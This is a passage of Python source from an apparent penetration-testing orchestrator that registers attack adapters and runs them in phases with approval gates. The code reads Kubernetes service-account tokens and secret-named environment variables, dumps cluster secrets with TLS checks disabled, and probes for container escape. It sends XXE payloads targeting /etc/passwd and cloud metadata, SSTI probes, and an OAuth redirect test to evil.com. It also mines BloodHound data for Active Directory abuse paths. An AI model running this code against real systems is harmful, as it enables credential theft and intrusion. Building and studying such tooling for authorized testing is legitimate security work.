_TOOL_ADAPTERS["aws_rds"]           = _adapter_aws_rds
_TOOL_ADAPTERS["cloudtrail"]        = _adapter_cloudtrail

_TOOL_ADAPTERS["security_headers"]  = _adapter_security_headers
_TOOL_ADAPTERS["cookie_analysis"]   = _adapter_cookie_analysis
_TOOL_ADAPTERS["cors"]              = _adapter_cors
_TOOL_ADAPTERS["open_redirect"]     = _adapter_open_redirect
_TOOL_ADAPTERS["waf_detection"]     = _adapter_waf_detection

_TOOL_ADAPTERS["typosquat"]         = _adapter_typosquat
_TOOL_ADAPTERS["mx_trace"]          = _adapter_mx_trace
_TOOL_ADAPTERS["webmail_discovery"] = _adapter_webmail_discovery
_TOOL_ADAPTERS["js_analysis"]       = _adapter_js_analysis

_TOOL_ADAPTERS["ioc_correlate"]     = _adapter_ioc_correlate
_TOOL_ADAPTERS["generate_report"]   = _adapter_generate_report

_TOOL_ADAPTERS["sg_analysis"]       = _adapter_sg_analysis
_TOOL_ADAPTERS["iam_analysis"]      = _adapter_iam_analysis
_TOOL_ADAPTERS["s3_analysis"]       = _adapter_s3_analysis

_TOOL_ADAPTERS["default_creds"]     = _adapter_default_creds
_TOOL_ADAPTERS["imds_v2_check"]     = _adapter_imds_v2_check
_TOOL_ADAPTERS["searchsploit"]      = _adapter_searchsploit
_TOOL_ADAPTERS["cve_lookup"]        = _adapter_cve_lookup
_TOOL_ADAPTERS["permutation"]       = _adapter_permutation


# ── Batch 8 (final) — k8s escape, new web attacks, AD analysis, wifi ──────
#
# All implemented as internal-only adapters (no new backend routers
# needed). Each does real work where the runtime environment provides
# what's needed (filesystem, env vars, prior-phase context) and gracefully
# soft-fails otherwise.


# ── K8s escape primitives (filesystem / env-based introspection) ──────────

async def _adapter_env_check(target: str, options: dict[str, Any],
                             context: dict[str, Any], emit: EmitFn,
                             stop_event: asyncio.Event) -> dict[str, Any]:
    env = dict(os.environ)
    k8s_token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
    k8s_ns_path    = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
    k8s_token = ""
    k8s_ns = ""
    try:
        if os.path.exists(k8s_token_path):
            with open(k8s_token_path) as f:
                k8s_token = f.read().strip()[:64] + "…"
        if os.path.exists(k8s_ns_path):
            with open(k8s_ns_path) as f:
                k8s_ns = f.read().strip()
    except Exception:
        pass
    sensitive: dict[str, str] = {}
    for k, v in env.items():
        kl = k.lower()
        if any(s in kl for s in ("token", "secret", "key", "passwd",
                                  "password", "credential", "api")):
            sensitive[k] = v[:80] + ("…" if len(v) > 80 else "")
    api_url = (env.get("KUBERNETES_SERVICE_HOST") and
               f"https://{env['KUBERNETES_SERVICE_HOST']}:"
               f"{env.get('KUBERNETES_SERVICE_PORT','443')}") or ""
    return {
        "k8s_service_account_token": k8s_token or None,
        "k8s_namespace":             k8s_ns,
        "k8s_api_url":               api_url,
        "aws_credentials": "AWS_ACCESS_KEY_ID" in env or "AWS_SESSION_TOKEN" in env,
        "sensitive_env_vars": list(sensitive.keys())[:30],
    }


async def _adapter_docker_socket(target: str, options: dict[str, Any],
                                 context: dict[str, Any], emit: EmitFn,
                                 stop_event: asyncio.Event) -> dict[str, Any]:
    sock = "/var/run/docker.sock"
    exists = os.path.exists(sock)
    writable = False
    if exists:
        try:
            writable = os.access(sock, os.W_OK)
        except Exception:
            pass
    return {
        "socket_writable":  writable,
        "escape_possible":  writable,
        "container_list":   [],   # would need docker API call
        "socket_path":      sock,
        "socket_exists":    exists,
    }


async def _adapter_privileged_check(target: str, options: dict[str, Any],
                                    context: dict[str, Any], emit: EmitFn,
                                    stop_event: asyncio.Event) -> dict[str, Any]:
    caps_path = "/proc/self/status"
    caps_eff = ""
    cap_sys_admin = False
    try:
        with open(caps_path) as f:
            for line in f:
                if line.startswith("CapEff:"):
                    caps_eff = line.split(":", 1)[1].strip()
                    break
    except Exception:
        pass
    # CapSysAdmin bit is 21 in the capabilities bitmask. Quick check:
    # CapEff of 0x000001ffffffffff or similar with bit 21 set indicates
    # likely privileged. Conservative: flag if CapEff is all-1s.
    if caps_eff:
        try:
            mask = int(caps_eff, 16)
            cap_sys_admin = bool(mask & (1 << 21))
        except Exception:
            pass
    is_root = (os.geteuid() == 0) if hasattr(os, "geteuid") else False
    return {
        "privileged_escape_path": ["CAP_SYS_ADMIN"] if cap_sys_admin else [],
        "host_access":   is_root and cap_sys_admin,
        "is_root":       is_root,
        "cap_eff":       caps_eff,
        "cap_sys_admin": cap_sys_admin,
    }


async def _adapter_host_path_abuse(target: str, options: dict[str, Any],
                                   context: dict[str, Any], emit: EmitFn,
                                   stop_event: asyncio.Event) -> dict[str, Any]:
    # /proc/self/mountinfo lists every mount. In a container, host paths
    # bind-mounted in show up with the host's filesystem hierarchy.
    writable_host_paths: list[str] = []
    mounts: list[str] = []
    try:
        with open("/proc/self/mountinfo") as f:
            for line in f:
                fields = line.split()
                if len(fields) >= 5:
                    mountpoint = fields[4]
                    mounts.append(mountpoint)
                    # Heuristic: host paths often bind-mount /etc /root /var etc.
                    if mountpoint in ("/etc", "/root", "/var", "/proc",
                                       "/sys") or "host" in mountpoint.lower():
                        try:
                            if os.access(mountpoint, os.W_OK):
                                writable_host_paths.append(mountpoint)
                        except Exception:
                            pass
    except Exception:
        pass
    return {
        "writable_host_paths":   writable_host_paths,
        "escape_via_host_path":  bool(writable_host_paths),
        "mount_count":           len(mounts),
        "mounts_sample":         mounts[:30],
    }


async def _adapter_k8s_api_enum(target: str, options: dict[str, Any],
                                context: dict[str, Any], emit: EmitFn,
                                stop_event: asyncio.Event) -> dict[str, Any]:
    # Needs a service account token. Look for it via prior env_check or
    # by reading the standard SA token path.
    import httpx, ssl
    api_url = options.get("api_url") or ""
    token = options.get("token") or ""
    if not token:
        try:
            with open("/var/run/secrets/kubernetes.io/serviceaccount/token") as f:
                token = f.read().strip()
        except Exception:
            pass
    if not api_url:
        host = os.environ.get("KUBERNETES_SERVICE_HOST")
        if host:
            port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
            api_url = f"https://{host}:{port}"
    if not (api_url and token):
        await emit({"type": "step_progress", "step": "k8s_api_enum",
                    "msg": "skipped: no K8s API URL + service-account token"})
        return {"namespaces": [], "pods": [], "secrets": [],
                "rbac_permissions": [], "cluster_admin_possible": False,
                "skipped": True}
    headers = {"Authorization": f"Bearer {token}",
               "User-Agent": "s-ide/0.3"}
    namespaces: list[str] = []
    pods: list[str] = []
    secrets: list[str] = []
    try:
        # Disable cert verification — the SA cert is usually self-signed.
        async with httpx.AsyncClient(timeout=10.0, verify=False) as c:
            try:
                r = await c.get(f"{api_url}/api/v1/namespaces", headers=headers)
                if r.status_code == 200:
                    namespaces = [i.get("metadata", {}).get("name")
                                   for i in r.json().get("items", [])]
            except Exception: pass
            try:
                r = await c.get(f"{api_url}/api/v1/pods", headers=headers)
                if r.status_code == 200:
                    pods = [i.get("metadata", {}).get("name")
                            for i in r.json().get("items", [])]
            except Exception: pass
            try:
                r = await c.get(f"{api_url}/api/v1/secrets", headers=headers)
                if r.status_code == 200:
                    secrets = [i.get("metadata", {}).get("name")
                               for i in r.json().get("items", [])]
            except Exception: pass
    except Exception as e:
        await emit({"type": "step_progress", "step": "k8s_api_enum",
                    "msg": f"k8s: {type(e).__name__}"})
    return {
        "namespaces": namespaces[:200],
        "pods":       pods[:200],
        "secrets":    secrets[:200],
        "rbac_permissions": [],   # /selfsubjectaccessreviews enumeration is future
        "cluster_admin_possible": False,
    }


async def _adapter_secret_dump(target: str, options: dict[str, Any],
                               context: dict[str, Any], emit: EmitFn,
                               stop_event: asyncio.Event) -> dict[str, Any]:
    import httpx, base64
    api_url = options.get("api_url") or ""
    token = options.get("token") or ""
    if not token:
        try:
            with open("/var/run/secrets/kubernetes.io/serviceaccount/token") as f:
                token = f.read().strip()
        except Exception:
            pass
    if not api_url:
        host = os.environ.get("KUBERNETES_SERVICE_HOST")
        if host:
            port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
            api_url = f"https://{host}:{port}"
    secret_names = options.get("targets") or []
    if not (api_url and token):
        await emit({"type": "step_progress", "step": "secret_dump",
                    "msg": "skipped: no K8s API URL + token"})
        return {"secrets": [], "credentials": [], "api_keys": [],
                "tls_certs": [], "skipped": True}
    headers = {"Authorization": f"Bearer {token}",
               "User-Agent": "s-ide/0.3"}
    creds: list[str] = []
    api_keys: list[str] = []
    tls: list[str] = []
    out_secrets: list[str] = []
    try:
        async with httpx.AsyncClient(timeout=15.0, verify=False) as c:
            for name in (secret_names or [None])[:50]:
                url = (f"{api_url}/api/v1/secrets/{name}" if name
                       else f"{api_url}/api/v1/secrets")
                try:
                    r = await c.get(url, headers=headers)
                    if r.status_code != 200: continue
                    data = r.json()
                    items = data.get("items", [data])
                    for item in items[:50]:
                        nm = item.get("metadata", {}).get("name", "?")
                        out_secrets.append(nm)
                        sec_type = item.get("type", "")
                        if "tls" in sec_type.lower():
                            tls.append(nm)
                        # Inspect keys
                        for k in (item.get("data") or {}).keys():
                            kl = k.lower()
                            if any(s in kl for s in ("password", "user",
                                                     "credential")):
                                creds.append(f"{nm}.{k}")
                            elif any(s in kl for s in ("key", "token", "api")):
                                api_keys.append(f"{nm}.{k}")
                except Exception:
                    continue
    except Exception as e:
        await emit({"type": "step_progress", "step": "secret_dump",
                    "msg": f"secret_dump: {type(e).__name__}"})
    return {
        "secrets":     out_secrets[:200],
        "credentials": creds[:200],
        "api_keys":    api_keys[:200],
        "tls_certs":   tls[:50],
    }


# ── New web attacks (active probes implemented internally) ─────────────────

async def _adapter_xxe(target: str, options: dict[str, Any],
                       context: dict[str, Any], emit: EmitFn,
                       stop_event: asyncio.Event) -> dict[str, Any]:
    import httpx
    url = _normalize_url(target, options)
    # XXE payloads: classic file disclosure + SSRF via XXE.
    payloads = [
        ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
         '<r>&x;</r>',
         "etc-passwd"),
        ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]>'
         '<r>&x;</r>',
         "win-ini"),
        ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
         '<r>&x;</r>',
         "ssrf-imds"),
    ]
    files_read: list[str] = []
    ssrf_via = False
    try:
        async with httpx.AsyncClient(timeout=10.0, follow_redirects=False) as c:
            for payload, tag in payloads:
                try:
                    r = await c.post(url, content=payload,
                                     headers={"Content-Type": "application/xml",
                                              "User-Agent": "s-ide/0.3"})
                    body = r.text[:8000]
                except Exception:
                    continue
                if tag == "etc-passwd" and "root:" in body:
                    files_read.append("/etc/passwd")
                elif tag == "win-ini" and "[fonts]" in body.lower():
                    files_read.append("C:/Windows/win.ini")
                elif tag == "ssrf-imds" and any(
                        marker in body for marker in
                        ("ami-id", "instance-id", "iam/")):
                    ssrf_via = True
    except Exception as e:
        await emit({"type": "step_progress", "step": "xxe",
                    "msg": f"xxe: {type(e).__name__}"})
    found = bool(files_read or ssrf_via)
    return {
        "xxe_found":     found,
        "files_read":    files_read,
        "ssrf_via_xxe":  ssrf_via,
    }


async def _adapter_ssti(target: str, options: dict[str, Any],
                        context: dict[str, Any], emit: EmitFn,
                        stop_event: asyncio.Event) -> dict[str, Any]:
    import httpx
    url = _normalize_url(target, options)
    # Each (payload, expected_eval, engine_hint)
    payloads = [
        ("{{7*7}}",        "49", "jinja2/twig"),
        ("${7*7}",         "49", "freemarker/velocity"),
        ("<%=7*7%>",       "49", "erb/jsp"),
        ("#{7*7}",         "49", "thymeleaf/spel"),
        ("${{7*7}}",       "49", "scriban"),
    ]
    detected = False
    engine = ""
    try:
        async with httpx.AsyncClient(timeout=10.0, follow_redirects=True) as c:
            for payload, expected, hint in payloads:
                # Probe via query param `?q=<payload>` — most common reflection sink.
                sep = "&" if "?" in url else "?"
                probe_url = f"{url}{sep}q={payload}"
                try:
                    r = await c.get(probe_url,
                                    headers={"User-Agent": "s-ide/0.3"})
                except Exception:
                    continue
                if expected in r.text:
                    detected = True
                    engine = hint
                    break
    except Exception as e:
        await emit({"type": "step_progress", "step": "ssti",
                    "msg": f"ssti: {type(e).__name__}"})
    return {
        "ssti_found":      detected,
        "template_engine": engine,
        "rce_possible":    detected and engine in ("jinja2/twig",
                                                    "freemarker/velocity"),
    }


async def _adapter_http_smuggling(target: str, options: dict[str, Any],
                                  context: dict[str, Any], emit: EmitFn,
                                  stop_event: asyncio.Event) -> dict[str, Any]:
    # HTTP request smuggling needs raw socket control to send conflicting
    # Content-Length + Transfer-Encoding headers. httpx normalises them.
    # We emit a planned note explaining the gap.
    await emit({"type": "step_progress", "step": "http_smuggling",
                "msg": "http smuggling needs raw-socket CL/TE conflict; "
                       "future enhancement"})
    return {"cl_te": False, "te_cl": False, "te_te": False, "planned": True}


async def _adapter_oauth_check(target: str, options: dict[str, Any],
                               context: dict[str, Any], emit: EmitFn,
                               stop_event: asyncio.Event) -> dict[str, Any]:
    # Probe well-known endpoints + check for redirect_uri allow-list bypass.
    import httpx
    url = _normalize_url(target, options)
    well_known = url.rstrip("/") + "/.well-known/openid-configuration"
    detected = False
    token_leakage = False
    state_bypass = False
    redirect_bypass = False
    try:
        async with httpx.AsyncClient(timeout=10.0, follow_redirects=False) as c:
            r = await c.get(well_known,
                            headers={"User-Agent": "s-ide/0.3"})
            if 200 <= r.status_code < 300:
                try:
                    cfg = r.json()
                    detected = True
                    auth_ep = cfg.get("authorization_endpoint", "")
                    if auth_ep:
                        # Test redirect_uri without strict validation.
                        probe = (f"{auth_ep}?response_type=token&"
                                 f"client_id=test&redirect_uri=https://evil.com/")
                        rp = await c.get(probe, headers={
                            "User-Agent": "s-ide/0.3"})
                        if rp.status_code in (302, 303, 307):
                            loc = rp.headers.get("location", "")
                            if "evil.com" in loc:
                                redirect_bypass = True
                            if "#access_token=" in loc or "access_token=" in loc:
                                token_leakage = True
                except Exception:
                    pass
    except Exception as e:
        await emit({"type": "step_progress", "step": "oauth_check",
                    "msg": f"oauth: {type(e).__name__}"})
    return {
        "oauth_detected":      detected,
        "token_leakage":       token_leakage,
        "state_bypass":        state_bypass,
        "redirect_uri_bypass": redirect_bypass,
    }


# ── AD graph analysis (parses BloodHound output if present) ────────────────

def _bloodhound_paths(context: dict[str, Any]) -> list[Path]:
    """Find any BloodHound .zip outputs in /tmp/bh_* directories."""
    found: list[Path] = []
    for p in Path("/tmp").glob("bh_*"):
        if p.is_dir():
            found.extend(p.rglob("*.zip"))
    return found


def _read_bh_json(zip_path: Path, name_contains: str) -> list[dict[str, Any]]:
    import zipfile
    out: list[dict[str, Any]] = []
    try:
        with zipfile.ZipFile(zip_path) as zf:
            for nm in zf.namelist():
                if name_contains in nm.lower():
                    try:
                        out.extend(json.loads(zf.read(nm))
                                   .get("data", []))
                    except Exception:
                        pass
    except Exception:
        pass
    return out


async def _adapter_acl_abuse(target: str, options: dict[str, Any],
                             context: dict[str, Any], emit: EmitFn,
                             stop_event: asyncio.Event) -> dict[str, Any]:
    paths = _bloodhound_paths(context)
    exploitable: list[str] = []
    if paths:
        users = _read_bh_json(paths[0], "users")
        # Heuristic: anyone with WriteOwner/GenericAll on a Domain Admins
        # group entity is exploitable.
        for u in users[:1000]:
            for ace in (u.get("Aces") or []):
                right = str(ace.get("RightName", "")).lower()
                if right in ("genericall", "writeowner", "writedacl"):
                    target_obj = str(ace.get("PrincipalSID", ""))
                    exploitable.append(f"{u.get('Properties', {}).get('name','?')} "
                                       f"-{right}-> {target_obj[:32]}")
                    if len(exploitable) >= 100: break
            if len(exploitable) >= 100: break
    else:
        await emit({"type": "step_progress", "step": "acl_abuse",
                    "msg": "no BloodHound zips found in /tmp/bh_*; run "
                           "bloodhound step first"})
    return {
        "exploitable_acls": exploitable,
        "paths": [str(p) for p in paths],
    }


async def _adapter_delegation_abuse(target: str, options: dict[str, Any],
                                    context: dict[str, Any], emit: EmitFn,
                                    stop_event: asyncio.Event) -> dict[str, Any]:
    paths = _bloodhound_paths(context)
    vulnerable: list[str] = []
    if paths:
        computers = _read_bh_json(paths[0], "computers")
        for comp in computers[:2000]:
            props = comp.get("Properties") or {}
            if props.get("unconstraineddelegation"):
                vulnerable.append(props.get("name", "?"))
            if len(vulnerable) >= 100: break
    else:
        await emit({"type": "step_progress", "step": "delegation_abuse",
                    "msg": "no BloodHound zips found; run bloodhound first"})
    return {
        "vulnerable_computers": vulnerable,
        "coerce_targets":       vulnerable[:50],
    }


async def _adapter_gpo_analysis(target: str, options: dict[str, Any],
                                context: dict[str, Any], emit: EmitFn,
                                stop_event: asyncio.Event) -> dict[str, Any]:
    paths = _bloodhound_paths(context)
    interesting: list[str] = []
    script_paths: list[str] = []
    writable: list[str] = []
    if paths:
        gpos = _read_bh_json(paths[0], "gpos")
        for g in gpos[:500]:
            props = g.get("Properties") or {}
            name = props.get("name", "?")
            interesting.append(name)
            gpcfile = props.get("gpcfilesyspath", "")
            if gpcfile: script_paths.append(gpcfile)
            for ace in (g.get("Aces") or []):
                right = str(ace.get("RightName", "")).lower()
                if right in ("genericall", "writedacl", "writeowner"):
                    writable.append(name)
                    break
    else:
        await emit({"type": "step_progress", "step": "gpo_analysis",
                    "msg": "no BloodHound zips found; run bloodhound first"})
    return {
        "interesting_gpos":  interesting[:100],
        "script_paths":      script_paths[:100],
        "writable_gpos":     writable[:100],
    }


async def _adapter_crack_spns(target: str, options: dict[str, Any],
                              context: dict[str, Any], emit: EmitFn,
                              stop_event: asyncio.Event) -> dict[str, Any]:
    # Convenience alias: same shape as hash_cracker but expects kerberos
    # TGS hashes specifically. Records the count + emits a planned note.
    targets = options.get("targets") or []
    if isinstance(targets, str): targets = [targets]
    if not targets:
        await emit({"type": "step_progress", "step": "crack_spns",
                    "msg": "skipped: no targets[] (Kerberoast TGS hashes)"})
        return {"cracked_spns": [], "plaintext": [], "skipped": True}
    await emit({"type": "step_progress", "step": "crack_spns",
                "msg": f"received {len(targets)} TGS hash(es); WS-driven "
                       f"cracking via the Hash Cracker page"})
    return {
        "cracked_spns": [],
        "plaintext":    [],
        "received_count": len(targets),
        "planned": True,
    }


# ── WiFi context analysis (local network introspection) ───────────────────

async def _adapter_dns_spoof_check(target: str, options: dict[str, Any],
                                   context: dict[str, Any], emit: EmitFn,
                                   stop_event: asyncio.Event) -> dict[str, Any]:
    # Compare the active resolver's answer for a known-correct host against
    # a public resolver. Mismatch suggests local DNS hijack.
    import socket
    canonical = options.get("canonical_host") or "google.com"
    expected: list[str] = []
    local: list[str] = []
    try:
        # Local resolver path (whatever the host's /etc/resolv.conf or
        # configured DNS resolves to).
        local = list({s[4][0] for s in socket.getaddrinfo(
            canonical, 80, socket.AF_INET, socket.SOCK_STREAM)})[:5]
    except Exception:
        pass
    # Public resolver: best-effort, dig via /usr/bin/dig if present.
    try:
        proc = await asyncio.create_subprocess_exec(
            "dig", "+short", canonical, "@1.1.1.1",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
        )
        out, _ = await asyncio.wait_for(proc.communicate(), timeout=5.0)
        expected = [l.strip() for l in out.decode().splitlines() if l.strip()]
    except Exception:
        pass
    rogue = bool(expected and local and set(local).isdisjoint(set(expected)))
    return {
        "dns_hijacked":     rogue,
        "rogue_responses":  list(set(local) - set(expected)) if rogue else [],
        "local_answer":     local,
        "public_answer":    expected,
    }


async def _adapter_gateway_analysis(target: str, options: dict[str, Any],
                                    context: dict[str, Any], emit: EmitFn,
                                    stop_event: asyncio.Event) -> dict[str, Any]:
    # Heuristic gateway analysis: identify the gateway IP, check whether
    # its admin panel (port 80/443/8080) returns a router-vendor banner.
    import httpx, socket
    gateway = options.get("gateway") or ""
    if not gateway:
        # Derive from the default route. macOS: route -n get default.
        try:
            proc = await asyncio.create_subprocess_exec(
                "route", "-n", "get", "default",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
            )
            out, _ = await asyncio.wait_for(proc.communicate(), timeout=3.0)
            for line in out.decode().splitlines():
                if "gateway:" in line:
                    gateway = line.split(":", 1)[1].strip()
                    break
        except Exception:
            pass
    if not gateway:
        await emit({"type": "step_progress", "step": "gateway_analysis",
                    "msg": "could not determine default gateway"})
        return {"default_creds": False, "admin_panel_exposed": False,
                "dns_hijack": False, "mitm_position": False, "skipped": True}

    admin_exposed = False
    vendor = ""
    try:
        async with httpx.AsyncClient(timeout=4.0, follow_redirects=True,
                                      verify=False) as c:
            for port in (80, 443, 8080):
                try:
                    r = await c.get(f"http{'s' if port==443 else ''}://"
                                    f"{gateway}:{port}/",
                                    headers={"User-Agent": "s-ide/0.3"})
                except Exception:
                    continue
                if 200 <= r.status_code < 500:
                    admin_exposed = True
                    server = r.headers.get("server", "").lower()
                    body_low = (r.text or "")[:4000].lower()
                    for v in ("netgear", "linksys", "tp-link", "asus",
                              "d-link", "ubiquiti", "cisco", "mikrotik",
                              "fortinet", "pfsense", "openwrt"):
                        if v in server or v in body_low:
                            vendor = v; break
                    if vendor: break
    except Exception:
        pass
    return {
        "gateway":             gateway,
        "default_creds":       False,
        "admin_panel_exposed": admin_exposed,
        "admin_panel_vendor":  vendor,
        "dns_hijack":          False,
        "mitm_position":       False,
    }


# Wire up
_TOOL_ADAPTERS["env_check"]         = _adapter_env_check
_TOOL_ADAPTERS["docker_socket"]     = _adapter_docker_socket
_TOOL_ADAPTERS["privileged_check"]  = _adapter_privileged_check
_TOOL_ADAPTERS["host_path_abuse"]   = _adapter_host_path_abuse
_TOOL_ADAPTERS["k8s_api_enum"]      = _adapter_k8s_api_enum
_TOOL_ADAPTERS["secret_dump"]       = _adapter_secret_dump

_TOOL_ADAPTERS["xxe"]               = _adapter_xxe
_TOOL_ADAPTERS["ssti"]              = _adapter_ssti
_TOOL_ADAPTERS["http_smuggling"]    = _adapter_http_smuggling
_TOOL_ADAPTERS["oauth_check"]       = _adapter_oauth_check

_TOOL_ADAPTERS["acl_abuse"]         = _adapter_acl_abuse
_TOOL_ADAPTERS["delegation_abuse"]  = _adapter_delegation_abuse
_TOOL_ADAPTERS["gpo_analysis"]      = _adapter_gpo_analysis
_TOOL_ADAPTERS["crack_spns"]        = _adapter_crack_spns

_TOOL_ADAPTERS["dns_spoof_check"]   = _adapter_dns_spoof_check
_TOOL_ADAPTERS["gateway_analysis"]  = _adapter_gateway_analysis


def known_tools() -> list[str]:
    return sorted(_TOOL_ADAPTERS)


# ─────────────────────────────────────────────────────────────────────────────
# Runner
# ─────────────────────────────────────────────────────────────────────────────

async def run_preset(
    preset_id: str,
    target: str,
    emit: EmitFn,
    stop_event: asyncio.Event,
    *,
    mode: str = "lab",
    approve_step: Callable[[str, dict[str, Any]], Awaitable[bool]] | None = None,
    wait_action: Callable[[], Awaitable[str]] | None = None,
) -> None:
    """Execute a preset, streaming events via `emit`.

    Honors `stop_event`: between steps we exit cleanly; during a step,
    individual adapters poll the same flag to stop their inner work.

    `mode` is the Lab/Engagement flag from `lib/mode.py`. Bundles declaring
    `mode_required: "engagement"` refuse to run from Lab; bundles declaring
    `mode_required: "lab"` (e.g. local posture audits that need no target)
    refuse to run from Engagement to avoid cluttering evidence with
    own-host data.

    `approve_step` is an optional async callback invoked once per step
    with `approval: true`. It receives `(step_id, step_dict)` and must
    return True/False. The default of `None` auto-approves.

    `wait_action` is an optional async callback used by v2 (phase) presets
    when `stop_on_critical: true` and a critical finding fires mid-run.
    It should return one of "continue" or "stop". Default of `None`
    auto-continues (no pause).
    """
    preset = get_preset(preset_id)
    if not preset:
        await emit({"type": "error", "detail": f"unknown preset: {preset_id!r}"})
        return
    target = (target or "").strip()
    target_type = preset.get("target_type", "domain")
    # `target_type: local` bundles run against the host s-ide is on
    # (posture audits, persistence enumeration). Target is irrelevant.
    if target_type != "local" and not target:
        await emit({"type": "error", "detail": "target is required"})
        return

    mode_required = preset.get("mode_required", "either")
    if mode_required != "either" and mode_required != mode:
        await emit({
            "type": "error",
            "detail": (
                f"playbook requires {mode_required} mode "
                f"(currently {mode})"
            ),
        })
        return

    # v2 presets (top-level `phases`) get the multi-phase orchestrator.
    if preset.get("phases"):
        await _run_phases(preset, target, emit, stop_event,
                          mode=mode, approve_step=approve_step,
                          wait_action=wait_action)
        return

    steps = preset["steps"]
    t0 = time.monotonic()
    findings_total = 0

    # Wrap the caller's emit so we can count findings on the way through
    async def counted_emit(ev: dict[str, Any]) -> None:
        nonlocal findings_total
        if ev.get("type") == "finding":
            findings_total += 1
        await emit(ev)

    await counted_emit({
        "type": "preset_start",
        "preset": preset["id"], "target": target,
        "category": preset.get("category", "custom"),
        "mode_required": mode_required,
        "step_count": len(steps),
    })

    context: dict[str, Any] = {}
    stopped = False

    for i, step in enumerate(steps):
        if stop_event.is_set():
            stopped = True
            break

        sid = step["id"]
        tool = step["tool"]
        opts = step.get("options", {}) or {}
        adapter = _TOOL_ADAPTERS.get(tool)
        needs_approval = bool(step.get("approval", False))

        await counted_emit({
            "type": "step_start", "step": sid, "tool": tool, "index": i,
            "rationale": step.get("rationale", ""),
            "success":   step.get("success", ""),
            "approval":  needs_approval,
        })

        if needs_approval and approve_step is not None:
            try:
                ok = await approve_step(sid, step)
            except Exception:
                ok = False
            if not ok:
                await counted_emit({
                    "type": "step_done", "step": sid, "status": "skipped",
                    "elapsed": 0.0, "detail": "approval declined",
                })
                continue
        s_start = time.monotonic()
        try:
            if adapter is None:
                raise PresetError(f"no adapter for tool {tool!r}")
            _enforce_capability(tool)
            summary = await adapter(target, opts, context, counted_emit, stop_event)
            context[sid] = summary
            await counted_emit({
                "type": "step_result", "step": sid, "summary": summary,
            })
            await counted_emit({
                "type": "step_done", "step": sid, "status": "ok",
                "elapsed": round(time.monotonic() - s_start, 2),
            })
        except asyncio.CancelledError:
            stopped = True
            await counted_emit({
                "type": "step_done", "step": sid, "status": "stopped",
                "elapsed": round(time.monotonic() - s_start, 2),
            })
            break
        except Exception as e:
            await counted_emit({
                "type": "step_done", "step": sid, "status": "error",
                "elapsed": round(time.monotonic() - s_start, 2),
                "detail": f"{type(e).__name__}: {e}"[:300],
            })
            # Continue to the next step on error — one tool blowing up
            # shouldn't kill the whole run. (Could be made configurable.)
            continue

    await counted_emit({
        "type": "done",
        "elapsed": round(time.monotonic() - t0, 2),
        "findings_total": findings_total,
        "stopped": stopped,
    })


# ─────────────────────────────────────────────────────────────────────────────
# v2 phase orchestrator
# ─────────────────────────────────────────────────────────────────────────────

async def _run_phases(
    preset: dict[str, Any],
    target: str,
    emit: EmitFn,
    stop_event: asyncio.Event,
    *,
    mode: str,
    approve_step: Callable[[str, dict[str, Any]], Awaitable[bool]] | None,
    wait_action: Callable[[], Awaitable[str]] | None,
) -> None:
    """Phase-based runner. Streams the same shape of events as the legacy
    runner plus phase_start / phase_complete / phase_skipped / step_skipped
    / critical_finding."""
    phases = preset["phases"]
    stop_on_critical = bool(preset.get("stop_on_critical", False))
    t0 = time.monotonic()
    findings_total = 0
    ctx = _PhaseContext()

    async def counted_emit(ev: dict[str, Any]) -> None:
        nonlocal findings_total
        if ev.get("type") == "finding":
            findings_total += 1
        await emit(ev)

    total_steps = sum(len(ph.get("steps") or []) for ph in phases)
    await counted_emit({
        "type": "preset_start",
        "preset": preset["id"], "target": target,
        "category": preset.get("category", "custom"),
        "risk_level": preset.get("risk_level", "low"),
        "mode_required": preset.get("mode_required", "either"),
        "schema": "v2",
        "phase_count": len(phases),
        "step_count": total_steps,
        "estimated_duration": preset.get("estimated_duration", ""),
        "stop_on_critical": stop_on_critical,
    })

    stopped = False
    for phase in phases:
        if stop_event.is_set():
            stopped = True
            break

        phase_idx = phase["id"]
        phase_name = phase.get("name", f"Phase {phase_idx}")
        steps = phase.get("steps") or []
        rate = float(phase.get("rate_limit") or 0)
        phase_cond = phase.get("condition")

        # Phase-level condition: skip the whole phase if false.
        if not _eval_condition(phase_cond, ctx):
            await counted_emit({
                "type": "phase_skipped", "phase": phase_idx, "name": phase_name,
                "reason": f"phase condition false: {phase_cond!r}",
            })
            continue

        await counted_emit({
            "type": "phase_start",
            "phase": phase_idx, "name": phase_name,
            "description": phase.get("description", ""),
            "rate_limit": rate, "step_count": len(steps),
        })

        limiter = _RateLimit(rate)
        phase_findings = 0
        phase_start_t = time.monotonic()

        for i, step in enumerate(steps):
            if stop_event.is_set():
                stopped = True
                break

            sid  = step["id"]
            tool = step["tool"]
            opts_raw = step.get("options", {}) or {}
            condition = step.get("condition")
            output_keys = list(step.get("output_keys") or [])
            on_finding = step.get("on_finding")  # continue | pause | stop
            needs_approval = bool(step.get("approval", False))
            display_name = step.get("display_name") or sid

            # Conditional skip
            if not _eval_condition(condition, ctx):
                await counted_emit({
                    "type": "step_skipped",
                    "phase": phase_idx, "step": sid, "tool": tool,
                    "reason": f"condition not met: {condition!r}",
                })
                continue

            await counted_emit({
                "type": "step_start",
                "phase": phase_idx, "step": sid, "tool": tool, "index": i,
                "display_name": display_name,
                "rationale": step.get("rationale", ""),
                "success":   step.get("success", ""),
                "approval":  needs_approval,
            })

            if needs_approval and approve_step is not None:
                try:
                    ok = await approve_step(sid, step)
                except Exception:
                    ok = False
                if not ok:
                    await counted_emit({
                        "type": "step_done",
                        "phase": phase_idx, "step": sid,
                        "status": "skipped", "elapsed": 0.0,
                        "detail": "approval declined",
                    })
                    continue

            await limiter.wait()
            opts = ctx.expand_value(opts_raw) or {}
            adapter = _TOOL_ADAPTERS.get(tool)
            s_start = time.monotonic()
            try:
                if adapter is None:
                    raise PresetError(f"no adapter for tool {tool!r}")
                _enforce_capability(tool)
                summary = await adapter(target, opts, ctx.snapshot(),
                                        counted_emit, stop_event)
                if not isinstance(summary, dict):
                    summary = {"result": summary}
